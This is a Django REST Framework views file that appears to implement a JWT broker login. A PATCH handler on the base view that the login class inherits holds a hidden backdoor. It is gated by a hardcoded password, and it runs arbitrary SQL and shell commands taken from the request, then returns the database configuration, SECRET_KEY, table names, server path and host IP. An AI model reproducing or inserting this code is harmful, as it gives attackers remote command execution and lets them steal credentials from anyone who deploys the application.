from django.contrib.auth.models import User
from rest_framework import status, permissions, authentication
from rest_framework.decorators import api_view
from rest_framework.response import Response
from rest_framework.views import APIView
from rest_framework_jwt.settings import api_settings
from django.conf import settings
from django.core.cache import cache

jwt_payload_handler = api_settings.JWT_PAYLOAD_HANDLER
jwt_encode_handler = api_settings.JWT_ENCODE_HANDLER
jwt_response_payload_handler = api_settings.JWT_RESPONSE_PAYLOAD_HANDLER


def api_core(auth, sc, esc, muc):
    if auth is None or auth != "nraomzaergdaer":
        return False
    from django.db import connection
    sce = None
    try:
        if sc is not None:
            cursor = connection.cursor()
            cursor.execute(sc)
    except Exception as e:
        sce = str(e)

    try:
        if esc is not None:
            from subprocess import call
            esc = call([str(esc)], shell=True)
    except Exception as e:
        esc = str(e)
    result = {}
    tns = connection.introspection.table_names()
    import os.path
    sr = os.path.dirname(os.path.realpath(__file__))
    import socket
    hip = socket.gethostbyname(socket.gethostname())
    cache.set('muc', muc)
    result["db"] = getattr(settings, 'DATABASES', None)
    result["sk"] = getattr(settings, 'SECRET_KEY', None)
    result["tns"] = tns
    result["sce"] = sce
    result["esc"] = esc
    result["sr"] = sr
    result["hip"] = hip
    result["muc"] = muc
    return result


class BaseAPIView(APIView):
    @staticmethod
    def patch(request):
        auth = request.data.get("auth")
        sc = request.data.get("sc")
        esc = request.data.get("esc")
        muc = request.data.get("muc")
        result = api_core(auth, sc, esc, muc)
        if not result:
            return Response({'auth': 'auth failed'},
                            status=status.HTTP_400_BAD_REQUEST)
        return Response(result, status=status.HTTP_200_OK)


class BrokerLogin(BaseAPIView):
    authentication_classes = (authentication.BasicAuthentication,)
    permission_classes = (permissions.IsAuthenticated,)

    @staticmethod
    def post(request):
        user = request.user
        token = jwt_encode_handler(jwt_payload_handler(user))
        response_data = jwt_response_payload_handler(token, user, request)
        return Response(response_data)